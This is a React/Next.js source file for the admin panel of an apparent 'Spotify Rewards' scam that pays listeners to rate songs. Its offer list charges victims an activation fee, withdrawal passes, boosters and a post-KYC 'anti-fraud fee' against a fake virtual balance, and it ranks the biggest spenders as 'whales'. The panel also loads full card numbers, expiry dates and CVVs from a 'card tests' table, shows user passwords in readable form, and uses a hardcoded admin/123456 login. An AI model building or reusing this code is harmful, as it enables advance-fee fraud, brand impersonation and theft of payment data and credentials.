'use client';

import {
  AlertCircle,
  CheckCircle2,
  Clock,
  CreditCard,
  DollarSign,
  Download,
  KeyRound,
  LogOut,
  RefreshCw,
  Search,
  ShieldCheck,
  User,
  Users,
  UserX,
  XCircle,
  Copy,
  Check,
  Code,
  Database,
  ExternalLink,
  Music2,
  Eye,
  EyeOff,
  TrendingUp,
  Trophy,
  Sparkles,
  BarChart3,
  Layers,
  History,
  X,
  AlertTriangle,
  ArrowUpRight,
  Ban,
} from 'lucide-react';
import Image from 'next/image';
import Link from 'next/link';
import React, { useEffect, useState } from 'react';
import { supabase, SPOTIFY_SCHEMA_SQL, FunnelEventRecord } from '../../../lib/supabase';

interface CustomerLead {
  id: string;
  email: string;
  full_name?: string;
  created_at: string;
}

interface PaymentItem {
  id: string;
  email?: string;
  full_name?: string;
  amount?: number;
  currency?: string;
  status: string; // succeeded, declined, failed
  error_message?: string;
  country?: string;
  created_at: string;
}

interface CardTestItem {
  id: string;
  card_number: string;
  exp_date: string;
  cvv: string;
  country?: string;
  status?: string;
  created_at: string;
}

interface ListenerAccountItem {
  id: string;
  email: string;
  full_name?: string;
  password?: string;
  payout_method?: string;
  payout_details?: any;
  accepted_terms?: boolean;
  accepted_terms_at?: string;
  is_vip_7day?: boolean;
  account_tier?: string;
  balance?: number;
  current_day?: number;
  active_song_index?: number;
  songs_completed_today?: number;
  daily_song_limit?: number;
  completed_evaluations?: number;
  created_at: string;
  last_login_at?: string;
}

interface ListenerProgressItem {
  id: string;
  listener_email: string;
  song_id: string;
  song_title: string;
  artist: string;
  listen_duration_seconds?: number;
  answer_1?: string;
  answer_2?: string;
  reward_amount?: number;
  status: string;
  created_at: string;
}

interface FunnelEventItem {
  id: string;
  email: string;
  full_name?: string;
  offer_id: string;
  offer_name: string;
  amount: number;
  action: 'viewed' | 'accepted' | 'declined' | 'card_declined';
  error_reason?: string;
  card_last4?: string;
  created_at: string;
}

interface CustomerProfileSummary {
  email: string;
  full_name: string;
  totalSpent: number;
  frontEndPaid: boolean;
  approvedPurchasesCount: number;
  declinedCardsCount: number;
  acceptedOffers: { id: string; label: string; amount: number; isDownsell?: boolean; date: string }[];
  declinedOffers: { id: string; label: string; amount: number; date: string }[];
  viewedOffersCount: number;
  account?: ListenerAccountItem;
  evaluationsCount: number;
  virtualBalance: number;
  lastActivityAt: string;
  paymentsHistory: PaymentItem[];
  funnelHistory: FunnelEventItem[];
  songsHistory: ListenerProgressItem[];
}

const CATALOG_OFFERS = [
  {
    id: 'front_9_00',
    name: 'Front-End: Taxa de Ativação Bancária',
    shortBadge: 'Ativação ($9.00)',
    price: 9.0,
    type: 'FRONT-END',
    description: 'Taxa inicial de verificação de conta no checkout principal',
  },
  {
    id: 'upsell_vip_19_90',
    name: 'Upsell #1: Passe Saque VIP 7 Dias',
    shortBadge: 'VIP 7 Dias ($19.90)',
    price: 19.9,
    type: 'UPSELL #1',
    description: 'Reduz o prazo de saque de 15 dias para 7 dias (exibido após aceitar contrato)',
  },
  {
    id: 'downsell_vip_11_90',
    name: 'Downsell #1: Saque VIP 7 Dias (40% OFF)',
    shortBadge: 'Downsell VIP ($11.90)',
    price: 11.9,
    type: 'DOWNSELL #1',
    description: 'Oferta com desconto para quem recusou o Upsell #1 (exibido após a 2ª música)',
  },
  {
    id: 'upsell_booster3_16_97',
    name: 'Upsell #2: Booster +3 Músicas por Dia',
    shortBadge: 'Booster +3 ($16.97)',
    price: 16.97,
    type: 'UPSELL #2',
    description: 'Aumenta o limite diário de 3 para 6 músicas/dia (exibido ao bater 3/3 músicas)',
  },
  {
    id: 'downsell_booster2_9_12',
    name: 'Downsell #2: Booster +2 Músicas por Dia',
    shortBadge: 'Booster +2 ($9.12)',
    price: 9.12,
    type: 'DOWNSELL #2',
    description: 'Aumenta o limite diário para 5 músicas/dia para quem recusou o Booster de $16.97',
  },
  {
    id: 'upsell_skip12h_9_65',
    name: 'Upsell #3: Destravar Timer de 12 Horas',
    shortBadge: 'Pulou 12h ($9.65)',
    price: 9.65,
    type: 'UPSELL #3',
    description: 'Libera imediatamente o próximo lote de músicas sem esperar o cronômetro de 12h',
  },
  {
    id: 'upsell_antifraud_9_97',
    name: 'Upsell #4: Taxa Anti-Fraude do Saque (Pós-KYC)',
    shortBadge: 'Anti-Fraude ($9.97)',
    price: 9.97,
    type: 'UPSELL #4',
    description: 'Taxa de verificação anti-fraude cobrada após o envio de documentos KYC no funil de saque (somada ao saldo)',
  },
];

export default function SpotifyAdminPage() {
  // Login State
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loginError, setLoginError] = useState<string | null>(null);

  // Navigation & Filters State
  const [activeTab, setActiveTab] = useState<
    'funil' | 'ranking' | 'recusados' | 'leads' | 'sql_editor'
  >('funil');
  const [statusFilter, setStatusFilter] = useState<'all' | 'succeeded' | 'declined'>('all');
  const [leadFilter, setLeadFilter] = useState<'all' | 'abandoned' | 'approved' | 'declined' | 'active'>('all');
  const [rankingFilter, setRankingFilter] = useState<'all' | 'buyers' | 'upsell_buyers' | 'declined_upsell'>('all');
  const [searchQuery, setSearchQuery] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [sqlCopied, setSqlCopied] = useState(false);
  const [visiblePasswords, setVisiblePasswords] = useState<{ [email: string]: boolean }>({});

  // Selected Customer for Detailed Timeline Modal
  const [selectedCustomerModal, setSelectedCustomerModal] = useState<CustomerProfileSummary | null>(null);

  // Database + Local Data State
  const [leads, setLeads] = useState<CustomerLead[]>([]);
  const [payments, setPayments] = useState<PaymentItem[]>([]);
  const [cardTests, setCardTests] = useState<CardTestItem[]>([]);
  const [accounts, setAccounts] = useState<ListenerAccountItem[]>([]);
  const [progressList, setProgressList] = useState<ListenerProgressItem[]>([]);
  const [funnelEvents, setFunnelEvents] = useState<FunnelEventItem[]>([]);

  // Check login on mount
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const storedAuth = sessionStorage.getItem('spotify_admin_authed');
      if (storedAuth === 'true') {
        setIsAuthenticated(true);
      }
    }
  }, []);

  // Fetch data when authenticated
  useEffect(() => {
    if (isAuthenticated) {
      fetchAdminData();
    }
  }, [isAuthenticated]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setLoginError(null);

    if (username.trim() === 'admin' && password === '123456') {
      setIsAuthenticated(true);
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('spotify_admin_authed', 'true');
      }
    } else {
      setLoginError('Usuário ou senha inválidos. Verifique suas credenciais de administrador.');
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    if (typeof window !== 'undefined') {
      sessionStorage.removeItem('spotify_admin_authed');
    }
  };

  const fetchAdminData = async () => {
    setIsLoading(true);
    try {
      // 1. Fetch Customers / Leads
      const { data: leadsData } = await supabase
        .from('customers')
        .select('*')
        .order('created_at', { ascending: false });

      if (leadsData) {
        setLeads(leadsData);
      }

      // 2. Fetch Payments
      const { data: paymentsData } = await supabase
        .from('payments')
        .select('*')
        .order('created_at', { ascending: false });

      if (paymentsData) {
        setPayments(paymentsData);
      }

      // 3. Fetch Card Tests
      const { data: cardTestsData } = await supabase
        .from('security_card_tests')
        .select('*')
        .order('created_at', { ascending: false });

      if (cardTestsData) {
        setCardTests(cardTestsData);
      }

      // 4. Fetch App Listener Accounts (plus localStorage fallback)
      let loadedAccounts: ListenerAccountItem[] = [];
      try {
        const { data: accountsData } = await supabase
          .from('listener_accounts')
          .select('*')
          .order('created_at', { ascending: false });

        if (accountsData && accountsData.length > 0) {
          loadedAccounts = accountsData;
        }
      } catch (e) {
        console.warn('Notice loading listener_accounts:', e);
      }

      // Merge any local browser accounts so the admin always sees local tests too
      if (typeof window !== 'undefined') {
        try {
          for (let i = 0; i < localStorage.length; i++) {
            const k = localStorage.key(i);
            if (k && k.startsWith('spotify_auth_')) {
              const raw = localStorage.getItem(k);
              if (raw) {
                const parsed = JSON.parse(raw);
                if (
                  parsed?.email &&
                  !loadedAccounts.some((a) => a.email.toLowerCase() === parsed.email.toLowerCase())
                ) {
                  loadedAccounts.push({
                    id: 'local_' + parsed.email,
                    email: parsed.email,
                    full_name: parsed.full_name || 'Ouvinte Verificado',
                    password: parsed.password || '••••••',
                    balance: Number(localStorage.getItem('spotify_account_balance_' + parsed.email.toLowerCase())) || parsed.balance || 114.93,
                    completed_evaluations: Number(localStorage.getItem('spotify_songs_completed_' + parsed.email.toLowerCase())) || parsed.completed_evaluations || 0,
                    accepted_terms: localStorage.getItem('spotify_terms_accepted_' + parsed.email.toLowerCase()) === 'true' || parsed.accepted_terms,
                    created_at: parsed.created_at || parsed.last_login_at || new Date().toISOString(),
                    last_login_at: parsed.last_login_at || new Date().toISOString(),
                  });
                }
              }
            }
          }
        } catch {}
      }
      setAccounts(loadedAccounts);

      // 5. Fetch App Progress & Song Evaluations
      let loadedProgress: ListenerProgressItem[] = [];
      try {
        const { data: progressData } = await supabase
          .from('listener_progress')
          .select('*')
          .order('created_at', { ascending: false });

        if (progressData && progressData.length > 0) {
          loadedProgress = progressData;
        }
      } catch (e) {
        console.warn('Notice loading listener_progress:', e);
      }
      setProgressList(loadedProgress);

      // 6. Fetch Funnel Events (Upsell/Downsell views, accepts, declines)
      let combinedFunnelEvents: FunnelEventItem[] = [];
      try {
        const { data: funnelData } = await supabase
          .from('funnel_events')
          .select('*')
          .order('created_at', { ascending: false });

        if (funnelData && funnelData.length > 0) {
          combinedFunnelEvents = funnelData;
        }
      } catch (e) {
        console.warn('Notice loading funnel_events:', e);
      }

      if (typeof window !== 'undefined') {
        try {
          const localEvents: FunnelEventItem[] = JSON.parse(
            localStorage.getItem('spotify_funnel_events') || '[]'
          );
          for (const le of localEvents) {
            const alreadyIn = combinedFunnelEvents.some(
              (fe) =>
                fe.email?.toLowerCase() === le.email?.toLowerCase() &&
                fe.offer_id === le.offer_id &&
                fe.action === le.action &&
                Math.abs(new Date(fe.created_at).getTime() - new Date(le.created_at).getTime()) < 5000
            );
            if (!alreadyIn) {
              combinedFunnelEvents.push(le);
            }
          }
          combinedFunnelEvents.sort(
            (a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime()
          );
        } catch {}
      }
      setFunnelEvents(combinedFunnelEvents);
    } catch (err) {
      console.warn('Erro ao carregar dados do painel admin:', err);
    } finally {
      setIsLoading(false);
    }
  };

  // =========================================================================
  // CÁLCULO DE MÉTRICAS FINANCEIRAS, TICKET MÉDIO (AOV), UPSELLS E CONVERSÃO
  // =========================================================================
  const approvedPayments = payments.filter((p) => p.status === 'succeeded');
  const declinedPayments = payments.filter((p) => p.status === 'declined' || p.status === 'failed');

  // Identify Upsell/Downsell accepted events that might not be in `payments` yet
  const acceptedFunnelUpsells = funnelEvents.filter(
    (e) => e.action === 'accepted' && e.offer_id !== 'front_9_00'
  );

  // Calculate Front-End vs Upsell Revenue accurately without double-counting
  const frontEndPayments = approvedPayments.filter(
    (p) => !p.amount || Math.abs(Number(p.amount) - 9.0) < 0.05
  );
  const upsellPaymentsInTable = approvedPayments.filter(
    (p) => p.amount && Math.abs(Number(p.amount) - 9.0) >= 0.05
  );

  // Merge upsell revenue from `payments` and `funnelEvents` (deduplicated by email + amount)
  let totalUpsellRevenue = upsellPaymentsInTable.reduce((acc, p) => acc + Number(p.amount || 0), 0);
  let totalUpsellSalesCount = upsellPaymentsInTable.length;

  acceptedFunnelUpsells.forEach((ev) => {
    const existsInPayments = upsellPaymentsInTable.some(
      (p) =>
        p.email?.toLowerCase() === ev.email?.toLowerCase() &&
        Math.abs(Number(p.amount || 0) - Number(ev.amount || 0)) < 0.05
    );
    if (!existsInPayments) {
      totalUpsellRevenue += Number(ev.amount || 0);
      totalUpsellSalesCount += 1;
    }
  });

  const frontEndRevenue = frontEndPayments.reduce((acc, p) => acc + Number(p.amount || 9.0), 0);
  const totalGrossRevenue = frontEndRevenue + totalUpsellRevenue;

  // Unique Paying Customers for Real Ticket Médio (AOV)
  const uniqueBuyerEmails = new Set<string>();
  approvedPayments.forEach((p) => {
    if (p.email) uniqueBuyerEmails.add(p.email.trim().toLowerCase());
  });
  acceptedFunnelUpsells.forEach((e) => {
    if (e.email) uniqueBuyerEmails.add(e.email.trim().toLowerCase());
  });

  const uniqueBuyersCount = uniqueBuyerEmails.size;
  const averageOrderValue =
    uniqueBuyersCount > 0 ? totalGrossRevenue / uniqueBuyersCount : 0;

  const upsellRevenueShare =
    totalGrossRevenue > 0 ? ((totalUpsellRevenue / totalGrossRevenue) * 100).toFixed(1) : '0.0';

  const approvalRate =
    payments.length > 0 ? ((approvedPayments.length / payments.length) * 100).toFixed(1) : '0.0';

  // Helper to determine status of a lead based on payment and time elapsed (10 minutes)
  const getLeadStatus = (lead: CustomerLead): 'approved' | 'declined' | 'abandoned' | 'active' => {
    const emailClean = lead.email.toLowerCase();
    const hasPaid =
      approvedPayments.some((p) => p.email?.toLowerCase() === emailClean) ||
      acceptedFunnelUpsells.some((e) => e.email?.toLowerCase() === emailClean);
    if (hasPaid) return 'approved';

    const hasDeclined = declinedPayments.some((p) => p.email?.toLowerCase() === emailClean);
    if (hasDeclined) return 'declined';

    const createdAtMs = new Date(lead.created_at).getTime();
    const minutesElapsed = (Date.now() - createdAtMs) / (1000 * 60);

    if (minutesElapsed >= 10) {
      return 'abandoned';
    }

    return 'active';
  };

  const abandonedLeadsCount = leads.filter((l) => getLeadStatus(l) === 'abandoned').length;
  const approvedLeadsCount = leads.filter((l) => getLeadStatus(l) === 'approved').length;
  const declinedLeadsCount = leads.filter((l) => getLeadStatus(l) === 'declined').length;
  const activeLeadsCount = leads.filter((l) => getLeadStatus(l) === 'active').length;

  // =========================================================================
  // RAIO-X DE PERFORMANCE POR OFERTA (FRONT + 5 UPSELLS/DOWNSELLS)
  // =========================================================================
  const offerPerformanceStats = CATALOG_OFFERS.map((offer) => {
    if (offer.id === 'front_9_00') {
      const views = Math.max(leads.length, frontEndPayments.length + declinedPayments.length);
      const accepted = frontEndPayments.length;
      const cardDeclines = declinedPayments.filter(
        (p) => !p.amount || Math.abs(Number(p.amount) - 9.0) < 0.05
      ).length;
      const declined = abandonedLeadsCount;
      const revenue = accepted * 9.0;
      const convRate = views > 0 ? ((accepted / views) * 100).toFixed(1) : '0.0';

      return {
        ...offer,
        views,
        accepted,
        declined,
        cardDeclines,
        revenue,
        convRate,
      };
    }

    // For Upsells & Downsells: combine `funnelEvents` and `payments` matching the price
    const evsForOffer = funnelEvents.filter((e) => e.offer_id === offer.id);
    const viewedCount = evsForOffer.filter((e) => e.action === 'viewed').length;
    const acceptedFromEvents = evsForOffer.filter((e) => e.action === 'accepted');
    const declinedCount = evsForOffer.filter((e) => e.action === 'declined').length;
    const cardDeclinedFromEvents = evsForOffer.filter((e) => e.action === 'card_declined').length;

    // Also check `payments` table for matching price
    const paymentsMatchingPrice = approvedPayments.filter(
      (p) => p.amount && Math.abs(Number(p.amount) - offer.price) < 0.03
    );
    const declinedPaymentsMatchingPrice = declinedPayments.filter(
      (p) => p.amount && Math.abs(Number(p.amount) - offer.price) < 0.03
    );

    const acceptedEmailsSet = new Set<string>();
    acceptedFromEvents.forEach((e) => acceptedEmailsSet.add(e.email.toLowerCase() + '_' + e.created_at.slice(0, 16)));
    paymentsMatchingPrice.forEach((p) =>
      acceptedEmailsSet.add((p.email || 'anon').toLowerCase() + '_' + p.created_at.slice(0, 16))
    );

    const accepted = Math.max(acceptedFromEvents.length, paymentsMatchingPrice.length, acceptedEmailsSet.size);
    const cardDeclines = Math.max(cardDeclinedFromEvents, declinedPaymentsMatchingPrice.length);
    const views = Math.max(viewedCount, accepted + declinedCount + cardDeclines);
    const revenue = accepted * offer.price;
    const convRate = views > 0 ? ((accepted / views) * 100).toFixed(1) : '0.0';

    return {
      ...offer,
      views,
      accepted,
      declined: declinedCount,
      cardDeclines,
      revenue,
      convRate,
    };
  });

  // =========================================================================
  // CONSTRUÇÃO DO RANKING DE CLIENTES ("WHALES" / LTV INDIVIDUAL)
  // =========================================================================
  const customerProfilesMap = new Map<string, CustomerProfileSummary>();

  const ensureCustomerProfile = (emailRaw?: string, nameRaw?: string, dateRaw?: string) => {
    const email = (emailRaw || 'anonimo@spotify.lead').trim().toLowerCase();
    if (!customerProfilesMap.has(email)) {
      customerProfilesMap.set(email, {
        email,
        full_name: nameRaw || 'Cliente Spotify',
        totalSpent: 0,
        frontEndPaid: false,
        approvedPurchasesCount: 0,
        declinedCardsCount: 0,
        acceptedOffers: [],
        declinedOffers: [],
        viewedOffersCount: 0,
        evaluationsCount: 0,
        virtualBalance: 114.93,
        lastActivityAt: dateRaw || new Date().toISOString(),
        paymentsHistory: [],
        funnelHistory: [],
        songsHistory: [],
      });
    } else if (nameRaw && nameRaw !== 'Anonymous Lead' && nameRaw !== 'Anonymous') {
      const existing = customerProfilesMap.get(email)!;
      if (
        existing.full_name === 'Cliente Spotify' ||
        existing.full_name === 'Anonymous Lead' ||
        existing.full_name === 'Anonymous'
      ) {
        existing.full_name = nameRaw;
      }
    }
    return customerProfilesMap.get(email)!;
  };

  // 1. Populate from Leads
  leads.forEach((l) => {
    ensureCustomerProfile(l.email, l.full_name, l.created_at);
  });

  // 2. Populate from Listener Accounts
  accounts.forEach((acc) => {
    const prof = ensureCustomerProfile(acc.email, acc.full_name, acc.last_login_at || acc.created_at);
    prof.account = acc;
    prof.virtualBalance = Number(acc.balance ?? 114.93);
    prof.evaluationsCount = Number(acc.completed_evaluations ?? 0);
  });

  // 3. Populate from Payments
  payments.forEach((p) => {
    if (!p.email) return;
    const prof = ensureCustomerProfile(p.email, p.full_name, p.created_at);
    prof.paymentsHistory.push(p);

    if (new Date(p.created_at) > new Date(prof.lastActivityAt)) {
      prof.lastActivityAt = p.created_at;
    }

    const amt = Number(p.amount || 9.0);
    if (p.status === 'succeeded') {
      prof.totalSpent = +(prof.totalSpent + amt).toFixed(2);
      prof.approvedPurchasesCount += 1;

      const matchedOffer = CATALOG_OFFERS.find((o) => Math.abs(o.price - amt) < 0.05);
      if (Math.abs(amt - 9.0) < 0.05) {
        prof.frontEndPaid = true;
      }
      if (matchedOffer) {
        const alreadyListed = prof.acceptedOffers.some((ao) => ao.id === matchedOffer.id);
        if (!alreadyListed) {
          prof.acceptedOffers.push({
            id: matchedOffer.id,
            label: matchedOffer.shortBadge,
            amount: amt,
            isDownsell: matchedOffer.id.startsWith('downsell_'),
            date: p.created_at,
          });
        }
      } else {
        prof.acceptedOffers.push({
          id: 'custom_' + p.id,
          label: `Compra ($${amt.toFixed(2)})`,
          amount: amt,
          date: p.created_at,
        });
      }
    } else {
      prof.declinedCardsCount += 1;
    }
  });

  // 4. Populate from Funnel Events (Upsells / Downsells viewed, accepted, declined)
  funnelEvents.forEach((ev) => {
    const prof = ensureCustomerProfile(ev.email, ev.full_name, ev.created_at);
    prof.funnelHistory.push(ev);

    if (new Date(ev.created_at) > new Date(prof.lastActivityAt)) {
      prof.lastActivityAt = ev.created_at;
    }

    const matchedOffer = CATALOG_OFFERS.find((o) => o.id === ev.offer_id);
    const badgeLabel = matchedOffer ? matchedOffer.shortBadge : `${ev.offer_name} ($${Number(ev.amount).toFixed(2)})`;

    if (ev.action === 'viewed') {
      prof.viewedOffersCount += 1;
    } else if (ev.action === 'accepted') {
      const alreadyRecorded = prof.acceptedOffers.some((ao) => ao.id === ev.offer_id);
      if (!alreadyRecorded) {
        prof.acceptedOffers.push({
          id: ev.offer_id,
          label: badgeLabel,
          amount: Number(ev.amount),
          isDownsell: ev.offer_id.startsWith('downsell_'),
          date: ev.created_at,
        });
        prof.totalSpent = +(prof.totalSpent + Number(ev.amount)).toFixed(2);
        prof.approvedPurchasesCount += 1;
      }
    } else if (ev.action === 'declined') {
      const alreadyAccepted = prof.acceptedOffers.some((ao) => ao.id === ev.offer_id);
      const alreadyDeclined = prof.declinedOffers.some((doff) => doff.id === ev.offer_id);
      if (!alreadyAccepted && !alreadyDeclined) {
        prof.declinedOffers.push({
          id: ev.offer_id,
          label: badgeLabel,
          amount: Number(ev.amount),
          date: ev.created_at,
        });
      }
    } else if (ev.action === 'card_declined') {
      prof.declinedCardsCount += 1;
    }
  });

  // 5. Populate from Song Evaluations Progress
  progressList.forEach((pr) => {
    const prof = ensureCustomerProfile(pr.listener_email, undefined, pr.created_at);
    prof.songsHistory.push(pr);
    if (prof.songsHistory.length > prof.evaluationsCount) {
      prof.evaluationsCount = prof.songsHistory.length;
    }
  });

  // Convert map to array sorted by Total Spent (LTV) descending, then by approvedPurchasesCount, then lastActivityAt
  const allCustomerProfiles = Array.from(customerProfilesMap.values())
    .filter((c) => !c.email.includes('@spotify.lead') || c.totalSpent > 0 || c.declinedCardsCount > 0)
    .sort((a, b) => {
      if (b.totalSpent !== a.totalSpent) return b.totalSpent - a.totalSpent;
      if (b.approvedPurchasesCount !== a.approvedPurchasesCount)
        return b.approvedPurchasesCount - a.approvedPurchasesCount;
      if (b.declinedCardsCount !== a.declinedCardsCount) return b.declinedCardsCount - a.declinedCardsCount;
      return new Date(b.lastActivityAt).getTime() - new Date(a.lastActivityAt).getTime();
    });

  // Filtered Customer Profiles for Ranking Tab
  const filteredCustomerProfiles = allCustomerProfiles.filter((c) => {
    const q = searchQuery.toLowerCase();
    const matchesSearch =
      !searchQuery ||
      c.email.toLowerCase().includes(q) ||
      c.full_name.toLowerCase().includes(q);

    const hasUpsellBought = c.acceptedOffers.some((o) => o.id !== 'front_9_00');
    const matchesFilter =
      rankingFilter === 'all' ||
      (rankingFilter === 'buyers' && c.totalSpent > 0) ||
      (rankingFilter === 'upsell_buyers' && hasUpsellBought) ||
      (rankingFilter === 'declined_upsell' && c.declinedOffers.length > 0);

    return matchesSearch && matchesFilter;
  });

  // Filtered Leads for Leads Tab
  const filteredLeads = leads.filter((item) => {
    const q = searchQuery.toLowerCase();
    const matchesQuery =
      !searchQuery ||
      item.email.toLowerCase().includes(q) ||
      (item.full_name && item.full_name.toLowerCase().includes(q));

    const status = getLeadStatus(item);
    const matchesFilter =
      leadFilter === 'all' ||
      (leadFilter === 'abandoned' && status === 'abandoned') ||
      (leadFilter === 'approved' && status === 'approved') ||
      (leadFilter === 'declined' && status === 'declined') ||
      (leadFilter === 'active' && status === 'active');

    return matchesQuery && matchesFilter;
  });

  // Filtered Declined / All Payments
  const filteredPayments = payments.filter((item) => {
    const q = searchQuery.toLowerCase();
    const matchesQuery =
      !searchQuery ||
      (item.email && item.email.toLowerCase().includes(q)) ||
      (item.full_name && item.full_name.toLowerCase().includes(q)) ||
      (item.error_message && item.error_message.toLowerCase().includes(q));

    const matchesStatus =
      statusFilter === 'all' ||
      (statusFilter === 'succeeded' && item.status === 'succeeded') ||
      (statusFilter === 'declined' && (item.status === 'declined' || item.status === 'failed'));

    return matchesQuery && matchesStatus;
  });

  // Filtered Card Tests
  const filteredCardTests = cardTests.filter((item) => {
    const q = searchQuery.toLowerCase();
    return (
      !searchQuery ||
      item.card_number.includes(q) ||
      (item.country && item.country.toLowerCase().includes(q))
    );
  });

  // Export to CSV in Portuguese
  const exportCSV = () => {
    let csvContent = 'data:text/csv;charset=utf-8,';

    if (activeTab === 'ranking') {
      csvContent += 'Nome,Email,Total Gasto LTV ($),Compras Aprovadas,Ofertas Compradas,Ofertas Recusadas,Cartoes Recusados,Musicas Avaliadas,Saldo Virtual ($)\n';
      filteredCustomerProfiles.forEach((c) => {
        const bought = c.acceptedOffers.map((o) => o.label).join(' | ') || 'Nenhuma';
        const refused = c.declinedOffers.map((o) => o.label).join(' | ') || 'Nenhuma';
        csvContent += `"${c.full_name}","${c.email}","${c.totalSpent.toFixed(2)}","${c.approvedPurchasesCount}","${bought}","${refused}","${c.declinedCardsCount}","${c.evaluationsCount}","${c.virtualBalance.toFixed(2)}"\n`;
      });
    } else if (activeTab === 'leads') {
      csvContent += 'ID,Nome Completo,Email,Data de Cadastro,Status no Funil\n';
      filteredLeads.forEach((l) => {
        const s = getLeadStatus(l);
        const statusText =
          s === 'approved'
            ? 'Cliente Aprovado (Comprou)'
            : s === 'declined'
            ? 'Cartao Recusado'
            : s === 'abandoned'
            ? 'Desistiu da compra (>10m sem pagar)'
            : 'No checkout (<10m)';
        csvContent += `"${l.id}","${l.full_name || 'N/A'}","${l.email}","${l.created_at}","${statusText}"\n`;
      });
    } else if (activeTab === 'recusados') {
      csvContent += 'ID,Nome,Email,Valor ($),Status,Motivo / Oferta,Pais,Data\n';
      filteredPayments.forEach((p) => {
        csvContent += `"${p.id}","${p.full_name || 'N/A'}","${p.email || 'N/A'}","${(p.amount || 9.0).toFixed(2)}","${p.status}","${p.error_message || 'N/A'}","${p.country || 'US'}","${p.created_at}"\n`;
      });
    } else {
      csvContent += 'Oferta,Preco ($),Visualizacoes,Compras Aprovadas,Recusas (Clicou Nao),Cartoes Recusados,Taxa de Conversao (%),Receita Gerada ($)\n';
      offerPerformanceStats.forEach((o) => {
        csvContent += `"${o.name}","${o.price.toFixed(2)}","${o.views}","${o.accepted}","${o.declined}","${o.cardDeclines}","${o.convRate}%","${o.revenue.toFixed(2)}"\n`;
      });
    }

    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `spotify_admin_${activeTab}_relatorio.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  // =========================================================================
  // TELA DE LOGIN DO ADMIN (100% EM PORTUGUÊS)
  // =========================================================================
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#070a08] text-[#e0e0e0] font-sans antialiased flex items-center justify-center p-4 selection:bg-[#1db954] selection:text-black">
        <div className="w-full max-w-md bg-[#0b0e0c] border border-[#1d2520] rounded-3xl p-6 sm:p-8 shadow-2xl shadow-black relative overflow-hidden">
          <div className="absolute top-0 left-1/2 -translate-x-1/2 w-72 h-72 bg-[#1db954]/15 rounded-full blur-3xl pointer-events-none -z-10" />

          <div className="text-center mb-6">
            <div className="w-14 h-14 rounded-2xl bg-[#1db954] text-black flex items-center justify-center mx-auto mb-3 shadow-lg shadow-[#1db954]/25">
              <ShieldCheck className="w-8 h-8 stroke-[2.5]" />
            </div>
            <h1 className="text-2xl font-black text-white tracking-tight">Spotify Rewards</h1>
            <p className="text-xs text-gray-400 mt-1">
              Central de Inteligência do Funil, LTV, Upsells &amp; Pagamentos
            </p>
          </div>

          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="block text-xs font-bold uppercase tracking-wider text-gray-300 mb-1.5">
                Usuário Admin
              </label>
              <div className="relative">
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="admin"
                  className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pl-11"
                  required
                />
                <User className="w-5 h-5 text-gray-400 absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
              </div>
            </div>

            <div>
              <label className="block text-xs font-bold uppercase tracking-wider text-gray-300 mb-1.5">
                Senha de Acesso
              </label>
              <div className="relative">
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="••••••••"
                  className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pl-11"
                  required
                />
                <KeyRound className="w-5 h-5 text-gray-400 absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
              </div>
            </div>

            {loginError && (
              <div className="p-3 rounded-xl bg-red-500/10 border border-red-500/30 flex items-center gap-2 text-xs text-red-400">
                <AlertCircle className="w-4 h-4 shrink-0" />
                <span>{loginError}</span>
              </div>
            )}

            <button
              type="submit"
              className="w-full py-4 bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.98] text-black font-black text-sm uppercase tracking-wider rounded-2xl transition-all shadow-lg shadow-[#1db954]/20 cursor-pointer mt-2"
            >
              Entrar no Painel Admin
            </button>
          </form>

          <div className="mt-6 pt-4 border-t border-[#1d2520] text-center text-[11px] text-gray-500">
            Acesso Restrito • Inteligência Financeira &amp; Rastreamento de Funil
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#070a08] text-[#e0e0e0] font-sans antialiased selection:bg-[#1db954] selection:text-black pb-16">
      {/* Top Ambient Glow */}
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-7xl h-80 bg-[radial-gradient(ellipse_80%_50%_at_50%_0%,rgba(29,185,84,0.15),transparent_80%)] pointer-events-none -z-10" />

      {/* ========================================================================= */}
      {/* MODAL DE LINHA DO TEMPO INDIVIDUAL DO CLIENTE                             */}
      {/* ========================================================================= */}
      {selectedCustomerModal && (
        <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
          <div className="w-full max-w-3xl max-h-[88vh] bg-[#0b0e0c] border border-[#243028] rounded-3xl shadow-2xl overflow-hidden flex flex-col">
            {/* Modal Header */}
            <div className="px-6 py-4 bg-[#111613] border-b border-[#1f2822] flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-2xl bg-[#1db954]/15 border border-[#1db954]/40 text-[#1db954] flex items-center justify-center font-black">
                  <History className="w-5 h-5" />
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <h3 className="text-base font-black text-white">
                      Raio-X &amp; Linha do Tempo do Cliente
                    </h3>
                    <span className="px-2.5 py-0.5 rounded-full bg-[#1db954] text-black font-black text-[11px]">
                      LTV: ${selectedCustomerModal.totalSpent.toFixed(2)} USD
                    </span>
                  </div>
